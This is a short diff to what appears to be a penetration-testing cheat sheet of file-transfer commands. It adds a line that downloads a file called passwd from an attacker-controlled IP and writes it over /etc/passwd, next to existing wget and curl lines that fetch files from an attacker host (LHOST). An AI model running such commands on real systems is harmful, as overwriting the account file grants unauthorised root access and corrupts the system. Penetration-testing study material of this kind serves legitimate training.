@@ -473,6 +473,7 @@ copy \\kali\share\file .
 
 ```powershell
 wget http://lhost/file
+wget 192.168.45.204/passwd -O /etc/passwd
 curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
